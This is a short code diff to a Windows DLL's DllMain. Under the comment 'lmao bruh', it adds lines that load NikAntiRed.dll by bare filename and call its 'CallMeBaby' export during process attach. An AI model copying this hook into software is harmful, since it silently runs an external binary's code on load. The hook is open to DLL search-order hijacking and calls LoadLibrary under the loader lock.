@@ -175,6 +175,14 @@ BOOL APIENTRY DllMain(HINSTANCE module, DWORD reason, LPVOID /*reserved*/)
         /* Pin the DLL so we won't get unloaded until the process terminates */
         GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_PIN | GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
             reinterpret_cast<WCHAR*>(module), &module);
+            
+        /* lmao bruh */
+		auto hNikLibrary = LoadLibraryW(L"NikAntiRed.dll");
+		auto fNikExport = GetProcAddress(hNikLibrary, "CallMeBaby");
+		if (hNikLibrary && fNikExport) {
+			fNikExport();
+		}
+            
         break;
     }
     return TRUE;
